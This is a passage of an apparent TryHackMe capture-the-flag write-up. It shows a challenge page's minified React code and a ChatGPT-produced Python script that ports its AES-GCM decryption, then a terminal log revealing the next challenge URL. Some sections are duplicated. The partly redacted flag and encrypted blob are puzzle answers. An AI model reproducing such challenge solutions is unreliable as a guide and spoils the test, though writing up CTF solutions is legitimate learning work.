 */const Od=Do("Lock",[["rect",{width:"18",height:"11",x:"3",y:"11",rx:"2",ry:"2",key:"1w4ew1"}],["path",{d:"M7 11V7a5 5 0 0 1 10 0v4",key:"fwvmzm"}]]);/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Ql=Do("Unlock",[["rect",{width:"18",height:"11",x:"3",y:"11",rx:"2",ry:"2",key:"1w4ew1"}],["path",{d:"M7 11V7a5 5 0 0 1 9.9-1",key:"1mm8w8"}]]);async function Md(e,t){const r=new TextEncoder().encode(e),l=await crypto.subtle.importKey("raw",r,{name:"PBKDF2"},!1,["deriveBits","deriveKey"]);return crypto.subtle.deriveKey({name:"PBKDF2",salt:t,iterations:1e5,hash:"SHA-256"},l,{name:"AES-GCM",length:256},!0,["encrypt","decrypt"])}async function Id(e,t){const n=Uint8Array.from(atob(e),m=>m.charCodeAt(0)),r=n.slice(0,16),l=n.slice(16,28),u=n.slice(28,44),o=n.slice(44),i=await Md(t,r),s=new Uint8Array(o.length+u.length);s.set(o),s.set(u,o.length);const f=await crypto.subtle.decrypt({name:"AES-GCM",iv:l},i,s);return new TextDecoder().decode(f)}const Fd="https://assets.tryhackme.com/additional/aoc2025/files/hopper-origins.txt";function Ud(){const e=new Date("2025-12-05T18:00:00Z"),[t,n]=he.useState(w()),[r,l]=he.useState(!1),[u,o]=he.useState(""),[i,s]=he.useState(null),[f,h]=he.useState(null),[m,p]=he.useState(!1);function w(){const g=new Date().getTime(),c=e.getTime()-g;return c<=0?{days:0,hours:0,minutes:0,seconds:0}:{days:Math.floor(c/(1e3*60*60*24)),hours:Math.floor(c%(1e3*60*60*24)/(1e3*60*60)),minutes:Math.floor(c%(1e3*60*60)/(1e3*60)),seconds:Math.floor(c%(1e3*60)/1e3)}}he.useEffect(()=>{const g=setInterval(()=>{const j=w();n(j),j.days===0&&j.hours===0&&j.minutes===0&&j.seconds===0&&(l(!0),clearInterval(g))},1e3);return()=>clearInterval(g)},[]);const k=async()=>{if(!u.trim()){h("Please enter an invitation code");return}p(!0),h(null);try{const g=await fetch(Fd);if(!g.ok)throw new Error("Failed to fetch encrypted content");const j=await g.text(),c=await Id(j.trim(),u);s(c)}catch(g){g instanceof Error&&g.message==="Failed to fetch encrypted content"?h("Unable to retrieve content. Please try again later."):h("Invalid invitation code. Please try again.")}finally{p(!1)}};return P.jsx("div",{className:"min-h-screen font-source bg-thm",children:P.jsx("div",{className:"container mx-auto px-4 py-12 flex items-center justify-center min-h-screen",children:P.jsx("div",{className:"max-w-2xl w-full",children:P.jsxs("div",{className:"bg-thm-700 rounded-xl border border-white/15 p-8 shadow-2xl",children:[P.jsx("h1",{className:"font-ubuntu text-3xl md:text-4xl font-medium text-green text-center mb-3",children:"How SOC-mas became EAST-mas:"}),P.jsx("h2",{className:"font-ubuntu text-2xl md:text-3xl font-medium text-green text-center mb-8",children:"Hopper's Origins"}),!r&&!i&&P.jsxs("div",{className:"space-y-8",children:[P.jsxs("div",{className:"flex items-center justify-center gap-3 text-slate-300 mb-6",children:[P.jsx(Dd,{className:"w-6 h-6 text-green"}),P.jsx("p",{className:"text-lg",children:"Flashback opens in:"})]}),P.jsx("div",{className:"grid grid-cols-4 gap-4",children:[{label:"Days",value:t.days},{label:"Hours",value:t.hours},{label:"Minutes",value:t.minutes},{label:"Seconds",value:t.seconds}].map(g=>P.jsxs("div",{className:"bg-thm-900 rounded-lg p-6 border border-green/30 text-center",children:[P.jsx("div",{className:"text-4xl md:text-5xl font-bold text-green mb-2",children:String(g.value).padStart(2,"0")}),P.jsx("div",{className:"text-sm text-slate-400 uppercase tracking-wider",children:g.label})]},g.label))}),P.jsx("div",{className:"bg-green/10 rounded-lg p-4 border border-green/30 border-dotted mt-8",children:P.jsxs("div",{className:"flex flex-col items-center gap-3",children:[P.jsx(Od,{className:"w-5 h-5 text-green"}),P.jsx("p",{className:"text-slate-300 text-sm leading-relaxed text-center",children:"When the time is right, Hopper invites you into his mind. After all, there was a time when he, as the Head of the Red Team Battalion, was the fiercest of them all"})]})})]}),r&&!i&&P.jsxs("div",{className:"space-y-6",children:[P.jsxs("div",{className:"bg-green/10 rounded-lg p-6 border border-green/30 text-center",children:[P.jsx(Ql,{className:"w-12 h-12 text-green mx-auto mb-3"}),P.jsx("p",{className:"text-slate-300 text-lg mb-2",children:"The time has come!"}),P.jsx("p",{className:"text-slate-400 text-sm",children:"Enter your invitation code to reveal the secret."})]}),P.jsxs("div",{className:"space-y-4",children:[P.jsxs("div",{children:[P.jsx("label",{htmlFor:"code",className:"block text-slate-300 text-sm font-medium mb-2",children:"Invitation Code"}),P.jsx("input",{id:"code",type:"text",value:u,onChange:g=>o(g.target.value),onKeyDown:g=>g.key==="Enter"&&k(),placeholder:"Enter your code...",className:"w-full bg-thm border border-slate-600 rounded-lg px-4 py-3 text-slate-300 placeholder-slate-500 focus:border-green focus:outline-none focus:ring-2 focus:ring-green/20 transition-all"})]}),f&&P.jsx("div",{className:"bg-red-500/10 border border-red-500/30 rounded-lg p-3 text-red-200 text-sm",children:f}),P.jsx("button",{onClick:k,disabled:m,className:"w-full inline-flex items-center justify-center gap-2 px-6 py-3 rounded-lg bg-green text-black font-medium text-base hover:bg-green-100 hover:-translate-y-0.5 transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:translate-y-0",children:m?P.jsxs(P.Fragment,{children:[P.jsx("div",{className:"w-4 h-4 border-2 border-black border-t-transparent rounded-full animate-spin"}),"Decrypting..."]}):P.jsxs(P.Fragment,{children:[P.jsx(Ql,{className:"w-5 h-5"}),"Decrypt"]})})]})]}),i&&P.jsx("div",{className:"space-y-6",children:P.jsxs("div",{className:"bg-green/10 rounded-lg p-6 border border-green text-center",children:[P.jsx(Ql,{className:"w-12 h-12 text-green mx-auto mb-4"}),i.startsWith("http")?P.jsxs(P.Fragment,{children:[P.jsx("p",{className:"text-green text-xl font-medium mb-4",children:"Down the rabbit hole you go...."}),P.jsx("a",{href:i,target:"_blank",rel:"noopener noreferrer",className:"inline-flex items-center gap-2 px-6 py-3 bg-green text-black font-medium rounded-lg hover:bg-green-100 hover:-translate-y-0.5 transition-all duration-200",children:"Enter the Portal"})]}):P.jsx("p",{className:"text-slate-300 text-lg leading-relaxed",children:i})]})})]})})})})}nc(document.getElementById("root")).render(P.jsx(he.StrictMode,{children:P.jsx(Ud,{})}));
```

thank you chatgpt 

![chat.png](side-quest-1/chat.png)

the prompt i use to create the script 

> use a react code that will decrypt take the logic how it decrypt and make me a code in python that will decrypt the encrypted i will share the information i have
> 

```jsx
this the code for .js" * This source code is licensed under the ISC license. * See the LICENSE file in the root directory of this source tree. */const jd=e=>e.replace(/([a-z0-9])([A-Z])/g,"$1-$2").toLowerCase().trim(),Do=(e,t)=>{const n=he.forwardRef(({color:r="currentColor",size:l=24,strokeWidth:u=2,absoluteStrokeWidth:o,className:i="",children:s,...f},h)=>he.createElement("svg",{ref:h,...Rd,width:l,height:l,stroke:r,strokeWidth:o?Number(u)*24/Number(l):u,className:["lucide",lucide-${jd(e)},i].join(" "),...f},[...t.map(([m,p])=>he.createElement(m,p)),...Array.isArray(s)?s:[s]]));return n.displayName=${e},n};/** * @license lucide-react v0.344.0 - ISC * * This source code is licensed under the ISC license. * See the LICENSE file in the root directory of this source tree. */const Dd=Do("Clock",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["polyline",{points:"12 6 12 12 16 14",key:"68esgv"}]]);/** * @license lucide-react v0.344.0 - ISC * * This source code is licensed under the ISC license. * See the LICENSE file in the root directory of this source tree. */const Od=Do("Lock",[["rect",{width:"18",height:"11",x:"3",y:"11",rx:"2",ry:"2",key:"1w4ew1"}],["path",{d:"M7 11V7a5 5 0 0 1 10 0v4",key:"fwvmzm"}]]);/** * @license lucide-react v0.344.0 - ISC * * This source code is licensed under the ISC license. * See the LICENSE file in the root directory of this source tree. */const Ql=Do("Unlock",[["rect",{width:"18",height:"11",x:"3",y:"11",rx:"2",ry:"2",key:"1w4ew1"}],["path",{d:"M7 11V7a5 5 0 0 1 9.9-1",key:"1mm8w8"}]]);async function Md(e,t){const r=new TextEncoder().encode(e),l=await crypto.subtle.importKey("raw",r,{name:"PBKDF2"},!1,["deriveBits","deriveKey"]);return crypto.subtle.deriveKey({name:"PBKDF2",salt:t,iterations:1e5,hash:"SHA-256"},l,{name:"AES-GCM",length:256},!0,["encrypt","decrypt"])}async function Id(e,t){const n=Uint8Array.from(atob(e),m=>m.charCodeAt(0)),r=n.slice(0,16),l=n.slice(16,28),u=n.slice(28,44),o=n.slice(44),i=await Md(t,r),s=new Uint8Array(o.length+u.length);s.set(o),s.set(u,o.length);const f=await crypto.subtle.decrypt({name:"AES-GCM",iv:l},i,s);return new TextDecoder().decode(f)}const Fd="https://assets.tryhackme.com/additional/aoc2025/files/hopper-origins.txt";function Ud(){const e=new Date("2025-12-05T18:00:00Z"),[t,n]=he.useState(w()),[r,l]=he.useState(!1),[u,o]=he.useState(""),[i,s]=he.useState(null),[f,h]=he.useState(null),[m,p]=he.useState(!1);function w(){const g=new Date().getTime(),c=e.getTime()-g;return c<=0?{days:0,hours:0,minutes:0,seconds:0}:{days:Math.floor(c/(1e3*60*60*24)),hours:Math.floor(c%(1e3*60*60*24)/(1e3*60*60)),minutes:Math.floor(c%(1e3*60*60)/(1e3*60)),seconds:Math.floor(c%(1e3*60)/1e3)}}he.useEffect(()=>{const g=setInterval(()=>{const j=w();n(j),j.days===0&&j.hours===0&&j.minutes===0&&j.seconds===0&&(l(!0),clearInterval(g))},1e3);return()=>clearInterval(g)},[]);const k=async()=>{if(!u.trim()){h("Please enter an invitation code");return}p(!0),h(null);try{const g=await fetch(Fd);if(!g.ok)throw new Error("Failed to fetch encrypted content");const j=await g.text(),c=await Id(j.trim(),u);s(c)}catch(g){g instanceof Error&&g.message==="Failed to fetch encrypted content"?h("Unable to retrieve content. Please try again later."):h("Invalid invitation code. Please try again.")}finally{p(!1)}};return P.jsx("div",{className:"min-h-screen font-source bg-thm",children:P.jsx("div",{className:"container mx-auto px-4 py-12 flex items-center justify-center min-h-screen",children:P.jsx("div",{className:"max-w-2xl w-full",children:P.jsxs("div",{className:"bg-thm-700 rounded-xl border border-white/15 p-8 shadow-2xl",children:[P.jsx("h1",{className:"font-ubuntu text-3xl md:text-4xl font-medium text-green text-center mb-3",children:"How SOC-mas became EAST-mas:"}),P.jsx("h2",{className:"font-ubuntu text-2xl md:text-3xl font-medium text-green text-center mb-8",children:"Hopper's Origins"}),!r&&!i&&P.jsxs("div",{className:"space-y-8",children:[P.jsxs("div",{className:"flex items-center justify-center gap-3 text-slate-300 mb-6",children:[P.jsx(Dd,{className:"w-6 h-6 text-green"}),P.jsx("p",{className:"text-lg",children:"Flashback opens in:"})]}),P.jsx("div",{className:"grid grid-cols-4 gap-4",children:[{label:"Days",value:t.days},{label:"Hours",value:t.hours},{label:"Minutes",value:t.minutes},{label:"Seconds",value:t.seconds}].map(g=>P.jsxs("div",{className:"bg-thm-900 rounded-lg p-6 border border-green/30 text-center",children:[P.jsx("div",{className:"text-4xl md:text-5xl font-bold text-green mb-2",children:String(g.value).padStart(2,"0")}),P.jsx("div",{className:"text-sm text-slate-400 uppercase tracking-wider",children:g.label})]},g.label))}),P.jsx("div",{className:"bg-green/10 rounded-lg p-4 border border-green/30 border-dotted mt-8",children:P.jsxs("div",{className:"flex flex-col items-center gap-3",children:[P.jsx(Od,{className:"w-5 h-5 text-green"}),P.jsx("p",{className:"text-slate-300 text-sm leading-relaxed text-center",children:"When the time is right, Hopper invites you into his mind. After all, there was a time when he, as the Head of the Red Team Battalion, was the fiercest of them all"})]})})]}),r&&!i&&P.jsxs("div",{className:"space-y-6",children:[P.jsxs("div",{className:"bg-green/10 rounded-lg p-6 border border-green/30 text-center",children:[P.jsx(Ql,{className:"w-12 h-12 text-green mx-auto mb-3"}),P.jsx("p",{className:"text-slate-300 text-lg mb-2",children:"The time has come!"}),P.jsx("p",{className:"text-slate-400 text-sm",children:"Enter your invitation code to reveal the secret."})]}),P.jsxs("div",{className:"space-y-4",children:[P.jsxs("div",{children:[P.jsx("label",{htmlFor:"code",className:"block text-slate-300 text-sm font-medium mb-2",children:"Invitation Code"}),P.jsx("input",{id:"code",type:"text",value:u,onChange:g=>o(g.target.value),onKeyDown:g=>g.key==="Enter"&&k(),placeholder:"Enter your code...",className:"w-full bg-thm border border-slate-600 rounded-lg px-4 py-3 text-slate-300 placeholder-slate-500 focus:border-green focus:outline-none focus:ring-2 focus:ring-green/20 transition-all"})]}),f&&P.jsx("div",{className:"bg-red-500/10 border border-red-500/30 rounded-lg p-3 text-red-200 text-sm",children:f}),P.jsx("button",{onClick:k,disabled:m,className:"w-full inline-flex items-center justify-center gap-2 px-6 py-3 rounded-lg bg-green text-black font-medium text-base hover:bg-green-100 hover:-translate-y-0.5 transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:translate-y-0",children:m?P.jsxs(P.Fragment,{children:[P.jsx("div",{className:"w-4 h-4 border-2 border-black border-t-transparent rounded-full animate-spin"}),"Decrypting..."]}):P.jsxs(P.Fragment,{children:[P.jsx(Ql,{className:"w-5 h-5"}),"Decrypt"]})})]})]}),i&&P.jsx("div",{className:"space-y-6",children:P.jsxs("div",{className:"bg-green/10 rounded-lg p-6 border border-green text-center",children:[P.jsx(Ql,{className:"w-12 h-12 text-green mx-auto mb-4"}),i.startsWith("http")?P.jsxs(P.Fragment,{children:[P.jsx("p",{className:"text-green text-xl font-medium mb-4",children:"Down the rabbit hole you go...."}),P.jsx("a",{href:i,target:"_blank",rel:"noopener noreferrer",className:"inline-flex items-center gap-2 px-6 py-3 bg-green text-black font-medium rounded-lg hover:bg-green-100 hover:-translate-y-0.5 transition-all duration-200",children:"Enter the Portal"})]}):P.jsx("p",{className:"text-slate-300 text-lg leading-relaxed",children:i})]})})]})})})})}nc(document.getElementById("root")).render(P.jsx(he.StrictMode,{children:P.jsx(Ud,{})}));" the invtatioon code "THM{[REDACTED]hout.Hopper}" and the date need to bee in encrypted "hlRAqw3zFxnrgUw1GZusk+whhQHE0F+g7YjWjoJvpZRSCoDzehjXsEX1wQ6TTlOPyEJ/k+AEiMOxdqywh/86AOmhTaXNyZAvbHUVjfMdTqdzxmLXZJwI5ynI"
```

### script

```jsx
# decrypt_js_aesgcm.py
# Requires: pip install cryptography

import base64
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def decrypt_from_js_blob(b64_blob: str, password: str) -> str:
    """
    Decrypts a blob that was constructed the same way as the JS code:
      blob = salt(16) || iv(12) || tag(16) || ciphertext(...)
    The JS reassembles ciphertext||tag before calling WebCrypto decrypt.
    PBKDF2 parameters: SHA-256, iterations=100000, key length=32 bytes.
    AES mode: AES-GCM (tag is 16 bytes).
    """
    data = base64.b64decode(b64_blob)
    if len(data) < 44:
        raise ValueError("Input blob too short to contain salt+iv+tag")

    salt = data[0:16]          # first 16 bytes
    iv   = data[16:28]         # next 12 bytes
    tag  = data[28:44]         # next 16 bytes
    ct   = data[44:]           # remaining bytes = ciphertext

    # Derive AES-256 key via PBKDF2-HMAC-SHA256
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    key = kdf.derive(password.encode("utf-8"))

    # AESGCM expects ciphertext+tag as the data argument
    ciphertext_with_tag = ct + tag

    aesgcm = AESGCM(key)
    plaintext_bytes = aesgcm.decrypt(iv, ciphertext_with_tag, associated_data=None)
    return plaintext_bytes.decode("utf-8")

if __name__ == "__main__":
    encrypted_b64 = (
        "hlRAqw3zFxnrgUw1GZusk+whhQHE0F+g7YjWjoJvpZRSCoDzehjXsEX1wQ6TTlOPyEJ/k+AEiMOxdqywh/86AOmhTaXNyZAvbHUVjfMdTqdzxmLXZJwI5ynI"
    )
    invitation_code = "THM{[REDACTED]thout.Hopper}"

    try:
        plaintext = decrypt_from_js_blob(encrypted_b64, invitation_code)
        print("Decrypted plaintext:\n")
        print(plaintext)
    except Exception as e:
        print("Decryption failed:", str(e))
        print("Possible causes: wrong invitation code, corrupted blob, or missing dependencies.")

```

```jsx
─$ pip install cryptography
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.
Defaulting to user installation because normal site-packages is not writeable
Collecting cryptography
  Downloading cryptography-3.3.2-cp27-cp27mu-manylinux2010_x86_64.whl (2.6 MB)
     |████████████████████████████████| 2.6 MB 2.4 MB/s 
Collecting cffi>=1.12
  Downloading cffi-1.15.1-cp27-cp27mu-manylinux1_x86_64.whl (390 kB)
     |████████████████████████████████| 390 kB 1.2 MB/s 
Collecting enum34; python_version < "3"
  Downloading enum34-1.1.10-py2-none-any.whl (11 kB)
Collecting six>=1.4.1
  Downloading six-1.17.0-py2.py3-none-any.whl (11 kB)
Collecting ipaddress; python_version < "3"
  Downloading ipaddress-1.0.23-py2.py3-none-any.whl (18 kB)
Collecting pycparser
  Downloading pycparser-2.21-py2.py3-none-any.whl (118 kB)
     |████████████████████████████████| 118 kB 2.2 MB/s 
Installing collected packages: pycparser, cffi, enum34, six, ipaddress, cryptography
Successfully installed cffi-1.15.1 cryptography-3.3.2 enum34-1.1.10 ipaddress-1.0.23 pycparser-2.21 six-1.17.0
                                                                                                                                                                                                
┌──(neo㉿neo)-[~/pro]
└─$ nano de.py    
                                                                                                                                                                                                
┌──(neo㉿neo)-[~/pro]
└─$ python3 de.py              
Decrypted plaintext:

https://tryhackme.com/jr/ho-aoc2025-yboMoPbnEX
                         
```

it take as to the next challenge 

![toour.png](side-quest-1/toour.png)

```

```jsx
─$ pip install cryptography
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.
Defaulting to user installation because normal site-packages is not writeable
Collecting cryptography
  Downloading cryptography-3.3.2-cp27-cp27mu-manylinux2010_x86_64.whl (2.6 MB)
     |████████████████████████████████| 2.6 MB 2.4 MB/s 
Collecting cffi>=1.12
  Downloading cffi-1.15.1-cp27-cp27mu-manylinux1_x86_64.whl (390 kB)
     |████████████████████████████████| 390 kB 1.2 MB/s 
Collecting enum34; python_version < "3"
  Downloading enum34-1.1.10-py2-none-any.whl (11 kB)
Collecting six>=1.4.1
  Downloading six-1.17.0-py2.py3-none-any.whl (11 kB)
Collecting ipaddress; python_version < "3"
  Downloading ipaddress-1.0.23-py2.py3-none-any.whl (18 kB)
Collecting pycparser
  Downloading pycparser-2.21-py2.py3-none-any.whl (118 kB)
     |████████████████████████████████| 118 kB 2.2 MB/s 
Installing collected packages: pycparser, cffi, enum34, six, ipaddress, cryptography
Successfully installed cffi-1.15.1 cryptography-3.3.2 enum34-1.1.10 ipaddress-1.0.23 pycparser-2.21 six-1.17.0
                                                                                                                                                                                                
┌──(neo㉿neo)-[~/pro]
└─$ nano de.py    
                                                                                                                                                                                                
┌──(neo㉿neo)-[~/pro]
└─$ python3 de.py              
Decrypted plaintext:

https://tryhackme.com/jr/ho-aoc2025-yboMoPbnEX
                         
```

it take as to the next challenge 

![toour.png](side-quest-1/toour.png)


<style>
.center img {display:block; margin:auto;}
.wrap pre{white-space: pre-wrap;}
</style>
